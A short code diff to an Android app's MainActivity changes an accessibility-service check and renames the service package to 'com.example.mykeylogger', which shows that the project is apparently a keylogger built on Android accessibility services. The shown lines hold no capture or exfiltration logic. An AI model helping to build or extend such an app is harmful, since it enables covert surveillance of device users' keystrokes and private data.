@@ -33,9 +33,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private boolean isAccessibilityServiceEnabled() {
-        // Check if your accessibility service is enabled in settings
-        // Replace YourAccessibilityService.class with your actual service class
-        String service = "com.example.my/.MyServiceKL";
+        // Check if accessibility service is enabled in settings
+
+        String service = "com.example.mykeylogger/.MyServiceKL";
         int accessibilityEnabled = Settings.Secure.getInt(
                 getContentResolver(),
                 android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
